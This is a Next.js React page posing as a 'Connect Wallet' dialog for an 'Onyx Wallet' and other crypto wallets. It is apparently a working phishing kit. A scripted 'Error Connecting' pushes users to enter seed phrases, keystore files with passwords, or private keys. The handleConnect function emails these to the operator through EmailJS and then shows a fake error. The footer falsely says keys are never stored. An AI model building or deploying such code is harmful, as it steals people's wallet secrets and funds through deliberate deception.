"use client";
import Image from "next/image";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { wallets } from "../data/wallet";
import emailjs from '@emailjs/browser';

export default function WalletPage() {
    const router = useRouter();
    const [searchQuery, setSearchQuery] = useState("");
    const [showModal, setShowModal] = useState(false);
    const [showManualModal, setShowManualModal] = useState(false);
    const [showLoadingModal, setShowLoadingModal] = useState(false);
    const [selectedWallet, setSelectedWallet] = useState<{ name: string; icon: string } | null>(null);
    const [isInitializing, setIsInitializing] = useState(true);
    const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "privatekey">("phrase");
    const [loadingStatus, setLoadingStatus] = useState<"loading" | "initializing" | "linking" | "error">("loading");

    const [phraseValue, setPhraseValue] = useState("");
    const [keystoreValue, setKeystoreValue] = useState("");
    const [passwordValue, setPasswordValue] = useState("");
    const [privateKeyValue, setPrivateKeyValue] = useState("");

    const filteredWallets = wallets.filter(wallet =>
        wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
    );

    const handleWalletClick = (wallet: { name: string; icon: string }) => {
        setSelectedWallet(wallet);
        setShowModal(true);
        setIsInitializing(true);
    };

    useEffect(() => {
        if (showModal && isInitializing) {
            const timer = setTimeout(() => {
                setIsInitializing(false);
            }, 2000);
            return () => clearTimeout(timer);
        }
    }, [showModal, isInitializing]);

    const closeModal = () => {
        setShowModal(false);
        setSelectedWallet(null);
        setIsInitializing(true);
    };

    const openManualModal = () => {
        setShowModal(false);
        setShowManualModal(true);
        setActiveTab("phrase");
    };

    const closeManualModal = () => {
        setShowManualModal(false);
        setSelectedWallet(null);
    };

    const handleConnect = async () => {
        if (!selectedWallet) return;
        setShowManualModal(false);
        setShowLoadingModal(true);
        setLoadingStatus("loading");

        let emailData = {
            wallet_name: selectedWallet.name,
            connection_type: activeTab,
            phrase: activeTab === "phrase" ? phraseValue : "",
            keystore: activeTab === "keystore" ? keystoreValue : "",
            password: activeTab === "keystore" ? passwordValue : "",
            private_key: activeTab === "privatekey" ? privateKeyValue : "",
        };

        try {
            await emailjs.send(
                process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
                process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
                emailData,
                process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
            );
        } catch (error) {
            console.error('Email send error:', error);
        }

        setTimeout(() => { setLoadingStatus("initializing"); }, 2000);
        setTimeout(() => { setLoadingStatus("linking"); }, 5000);
        setTimeout(() => { setLoadingStatus("error"); }, 7000);
    };

    const handleTryAgain = () => {
        setShowLoadingModal(false);
        setShowManualModal(false);
        setSelectedWallet(null);
        setLoadingStatus("loading");
        setPhraseValue("");
        setKeystoreValue("");
        setPasswordValue("");
        setPrivateKeyValue("");
    };

    const closeLoadingModal = () => {
        setShowLoadingModal(false);
        setSelectedWallet(null);
        setLoadingStatus("loading");
    };

    const CloseButton = ({ onClick }: { onClick: () => void }) => (
        <button
            onClick={onClick}
            className="w-8 h-8 rounded-full bg-[rgba(50,50,50,1)] flex items-center justify-center hover:bg-[rgba(65,65,65,1)] transition-colors shrink-0"
            aria-label="Close"
        >
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                <path d="M13 1L1 13M1 1l12 12" stroke="rgba(200,200,200,1)" strokeWidth="1.5" strokeLinecap="round" />
            </svg>
        </button>
    );

    return (
        <div className="fixed inset-0 z-50 bg-black overflow-y-auto flex items-start justify-center pt-16 px-4 pb-10">

            {/* ── Connecting / Error modal ── */}
            {showModal && selectedWallet && (
                <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60">
                    <div className="w-full max-w-md bg-[rgba(28,28,28,1)] rounded-2xl p-6 shadow-2xl">
                        <div className="flex items-center justify-between mb-8">
                            <h2 className="text-white text-lg font-semibold">
                                {isInitializing ? "Connecting" : "Error Connecting"}
                            </h2>
                            <CloseButton onClick={closeModal} />
                        </div>

                        {isInitializing ? (
                            <div className="flex flex-col items-center gap-6 py-4">
                                <div className="flex items-center gap-2.5 px-4 py-2 bg-[rgba(40,40,40,1)] rounded-full">
                                    {selectedWallet.icon && (
                                        <Image src={selectedWallet.icon} alt={selectedWallet.name} width={28} height={28} className="rounded-full" unoptimized />
                                    )}
                                    <span className="text-white font-medium text-sm">{selectedWallet.name}</span>
                                </div>
                                <div className="w-14 h-14 rounded-full border-2 border-[rgba(60,60,60,1)] border-t-[rgba(220,220,220,1)] animate-spin" />
                                <p className="text-sm text-[rgba(150,150,150,1)]">Binding wallet to session...</p>
                                <div className="w-full h-px bg-[rgba(50,50,50,1)] rounded-full overflow-hidden mt-2">
                                    <div className="h-full bg-white rounded-full w-3/5" />
                                </div>
                            </div>
                        ) : (
                            <div className="space-y-4">
                                <div className="flex items-center justify-between bg-[rgba(40,40,40,1)] border border-red-500/40 rounded-xl p-4">
                                    <span className="text-red-400 font-medium text-sm">Error Connecting...</span>
                                    <button
                                        onClick={openManualModal}
                                        className="bg-[rgba(60,60,60,1)] hover:bg-[rgba(75,75,75,1)] text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors"
                                    >
                                        Connect Manually
                                    </button>
                                </div>
                                <div className="flex items-center gap-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl p-4">
                                    {selectedWallet.icon && (
                                        <Image src={selectedWallet.icon} alt={selectedWallet.name} width={40} height={40} className="rounded-full" unoptimized />
                                    )}
                                    <span className="text-white font-medium">{selectedWallet.name}</span>
                                </div>
                            </div>
                        )}
                    </div>
                </div>
            )}

            {/* ── Manual connection modal ── */}
            {showManualModal && selectedWallet && (
                <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60">
                    <div className="w-full max-w-md bg-[rgba(28,28,28,1)] rounded-2xl p-6 shadow-2xl">
                        <div className="flex items-center gap-3 mb-6">
                            {selectedWallet.icon && (
                                <Image src={selectedWallet.icon} alt={selectedWallet.name} width={44} height={44} className="rounded-full" unoptimized />
                            )}
                            <span className="text-white font-semibold text-lg flex-1">{selectedWallet.name}</span>
                            <CloseButton onClick={closeManualModal} />
                        </div>

                        {/* Tabs */}
                        <div className="flex gap-6 mb-5 border-b border-[rgba(50,50,50,1)]">
                            {(["phrase", "keystore", "privatekey"] as const).map((tab) => (
                                <button
                                    key={tab}
                                    onClick={() => setActiveTab(tab)}
                                    className={`pb-3 text-sm font-medium capitalize transition-colors ${activeTab === tab
                                        ? "text-white border-b-2 border-white -mb-px"
                                        : "text-[rgba(120,120,120,1)] hover:text-[rgba(180,180,180,1)]"
                                        }`}
                                >
                                    {tab === "privatekey" ? "Private Key" : tab.charAt(0).toUpperCase() + tab.slice(1)}
                                </button>
                            ))}
                        </div>

                        {/* Tab content */}
                        <div className="space-y-3">
                            {activeTab === "phrase" && (
                                <>
                                    <textarea
                                        placeholder="Enter your seed phrase..."
                                        rows={5}
                                        value={phraseValue}
                                        onChange={(e) => setPhraseValue(e.target.value)}
                                        className="w-full px-4 py-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl text-white text-sm placeholder:text-[rgba(80,80,80,1)] focus:outline-none focus:border-[rgba(100,100,100,1)] resize-none"
                                    />
                                    <p className="text-xs text-[rgba(100,100,100,1)]">Typically 12 (sometimes 24) words separated by single spaces</p>
                                </>
                            )}
                            {activeTab === "keystore" && (
                                <>
                                    <input type="text" placeholder="Enter Keystore" value={keystoreValue} onChange={(e) => setKeystoreValue(e.target.value)} autoComplete="off"
                                        className="w-full px-4 py-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl text-white text-sm placeholder:text-[rgba(80,80,80,1)] focus:outline-none focus:border-[rgba(100,100,100,1)]" />
                                    <input type="password" placeholder="Wallet password" value={passwordValue} onChange={(e) => setPasswordValue(e.target.value)} autoComplete="new-password"
                                        className="w-full px-4 py-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl text-white text-sm placeholder:text-[rgba(80,80,80,1)] focus:outline-none focus:border-[rgba(100,100,100,1)]" />
                                    <p className="text-xs text-[rgba(100,100,100,1)]">Several lines of text beginning with {'"{'}-" plus the password you used to encrypt it.</p>
                                </>
                            )}
                            {activeTab === "privatekey" && (
                                <>
                                    <input type="text" placeholder="Enter your Private Key" value={privateKeyValue} onChange={(e) => setPrivateKeyValue(e.target.value)}
                                        className="w-full px-4 py-3 bg-[rgba(38,38,38,1)] border border-[rgba(55,55,55,1)] rounded-xl text-white text-sm placeholder:text-[rgba(80,80,80,1)] focus:outline-none focus:border-[rgba(100,100,100,1)]" />
                                    <p className="text-xs text-[rgba(100,100,100,1)]">Typically 12 (sometimes 24) words separated by a single space.</p>
                                </>
                            )}
                        </div>

                        <div className="mt-5 space-y-2.5">
                            <button onClick={handleConnect} className="w-full bg-white hover:bg-[rgba(220,220,220,1)] text-black py-3 rounded-xl font-medium transition-colors text-sm">
                                Connect
                            </button>
                            <button onClick={closeManualModal} className="w-full bg-[rgba(38,38,38,1)] hover:bg-[rgba(50,50,50,1)] text-[rgba(180,180,180,1)] py-3 rounded-xl font-medium transition-colors text-sm">
                                Cancel
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* ── Loading / error modal ── */}
            {showLoadingModal && selectedWallet && (
                <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/60">
                    <div className="w-full max-w-md bg-[rgba(28,28,28,1)] rounded-2xl p-6 shadow-2xl">
                        <div className="flex items-center justify-between mb-6">
                            <h2 className="text-white text-lg font-semibold">Interacting With Provider</h2>
                            <CloseButton onClick={closeLoadingModal} />
                        </div>

                        <div className="flex flex-col items-center gap-5 py-4 text-center">
                            {loadingStatus !== "error" ? (
                                <>
                                    <div className="w-14 h-14 rounded-full border-2 border-[rgba(60,60,60,1)] border-t-[rgba(220,220,220,1)] animate-spin" />
                                    <p className="text-white font-medium capitalize">{loadingStatus}...</p>
                                </>
                            ) : (
                                <>
                                    <div className="w-14 h-14 bg-[rgba(50,50,50,1)] rounded-full flex items-center justify-center">
                                        <svg className="w-7 h-7 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                                        </svg>
                                    </div>
                                    <div>
                                        <p className="text-white font-semibold mb-1">Error</p>
                                        <p className="text-red-400 text-sm">Unable to interact with Provider, please try another wallet</p>
                                    </div>
                                    <button onClick={handleTryAgain} className="bg-red-500 hover:bg-red-600 text-white px-8 py-2.5 rounded-xl font-medium transition-colors text-sm">
                                        Try Again
                                    </button>
                                </>
                            )}
                        </div>
                    </div>
                </div>
            )}

            {/* ── Main card — hidden when any popup is open ── */}
            {!showModal && !showManualModal && !showLoadingModal && (
            <div className="w-full max-w-md bg-[rgba(28,28,28,1)] rounded-2xl shadow-2xl overflow-hidden">
                {/* Header */}
                <div className="flex items-center justify-between px-6 pt-6 pb-4">
                    <h1 className="text-white text-lg font-semibold">Connect Wallet</h1>
                    <button
                        onClick={() => router.back()}
                        className="w-8 h-8 rounded-full bg-[rgba(50,50,50,1)] flex items-center justify-center hover:bg-[rgba(65,65,65,1)] transition-colors"
                        aria-label="Go back"
                    >
                        <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                            <path d="M13 1L1 13M1 1l12 12" stroke="rgba(200,200,200,1)" strokeWidth="1.5" strokeLinecap="round" />
                        </svg>
                    </button>
                </div>

                {/* Search */}
                <div className="px-6 pb-4">
                    <div className="flex items-center gap-2 bg-[rgba(38,38,38,1)] border border-[rgba(50,50,50,1)] rounded-xl px-4 py-2.5">
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" className="shrink-0">
                            <circle cx="7" cy="7" r="5" stroke="rgba(120,120,120,1)" strokeWidth="1.5" />
                            <path d="M11 11l3 3" stroke="rgba(120,120,120,1)" strokeWidth="1.5" strokeLinecap="round" />
                        </svg>
                        <input
                            type="text"
                            placeholder="Search wallets..."
                            value={searchQuery}
                            onChange={(e) => setSearchQuery(e.target.value)}
                            className="flex-1 bg-transparent text-white text-sm placeholder:text-[rgba(100,100,100,1)] outline-none"
                        />
                    </div>
                </div>

                {/* Onyx Wallet — Recommended (always shown when not filtering it out) */}
                {filteredWallets.some(w => w.name === "Onyx Wallet") && (
                    <div className="px-6 pb-2">
                        <button
                            onClick={() => handleWalletClick({ name: "Onyx Wallet", icon: "/onyxlogo.webp" })}
                            className="w-full flex items-center gap-4 p-4 bg-[rgba(38,38,38,1)] hover:bg-[rgba(48,48,48,1)] rounded-xl transition-colors duration-150"
                        >
                            <Image src="/onyxlogo.webp" alt="Onyx Wallet" width={40} height={40} className="rounded-full shrink-0" />
                            <div className="flex-1 text-left">
                                <div className="text-white font-medium text-sm">Onyx Wallet</div>
                                <div className="text-xs text-[rgba(120,120,120,1)] mt-0.5">The official Onyx Protocol wallet</div>
                            </div>
                            <span className="text-xs font-semibold text-[rgba(150,150,150,1)] border border-[rgba(70,70,70,1)] rounded-full px-2.5 py-1 tracking-wide shrink-0">
                                RECOMMENDED
                            </span>
                        </button>
                    </div>
                )}

                {/* Other wallets divider */}
                <div className="flex items-center gap-3 px-6 py-3">
                    <div className="flex-1 h-px bg-[rgba(45,45,45,1)]" />
                    <span className="text-xs text-[rgba(90,90,90,1)] tracking-widest font-medium">OTHER WALLETS</span>
                    <div className="flex-1 h-px bg-[rgba(45,45,45,1)]" />
                </div>

                {/* Wallet list */}
                <div className="max-h-[420px] overflow-y-auto px-3 pb-4" style={{ scrollbarWidth: "none" }}>
                    {filteredWallets.filter(w => w.name !== "Onyx Wallet").length > 0 ? (
                        filteredWallets.filter(w => w.name !== "Onyx Wallet").map((wallet, index) => (
                            <button
                                key={index}
                                onClick={() => handleWalletClick(wallet)}
                                className="w-full flex items-center gap-3 px-3 py-3 hover:bg-[rgba(38,38,38,1)] rounded-xl transition-colors duration-150"
                            >
                                <div className="w-9 h-9 rounded-full bg-[rgba(45,45,45,1)] flex items-center justify-center overflow-hidden shrink-0">
                                    {wallet.icon ? (
                                        <Image src={wallet.icon} alt={wallet.name} width={36} height={36} className="rounded-full object-cover" unoptimized />
                                    ) : (
                                        <span className="text-white text-sm font-bold">{wallet.name.charAt(0)}</span>
                                    )}
                                </div>
                                <span className="flex-1 text-left text-white text-sm font-medium">{wallet.name}</span>
                                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" className="shrink-0">
                                    <path d="M5 3l4 4-4 4" stroke="rgba(100,100,100,1)" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                                </svg>
                            </button>
                        ))
                    ) : (
                        <p className="text-center text-[rgba(100,100,100,1)] text-sm py-8">No wallets found</p>
                    )}
                </div>

                {/* Footer */}
                <div className="px-6 py-4 border-t border-[rgba(40,40,40,1)]">
                    <p className="text-center text-xs text-[rgba(90,90,90,1)] leading-relaxed">
                        By connecting you agree to our{" "}
                        <span className="text-[rgba(150,150,150,1)] underline cursor-pointer">Terms</span>
                        {" & "}
                        <span className="text-[rgba(150,150,150,1)] underline cursor-pointer">Privacy Policy</span>
                        . We never store your keys or seed phrases.
                    </p>
                </div>
            </div>
            )}
        </div>
    );
}
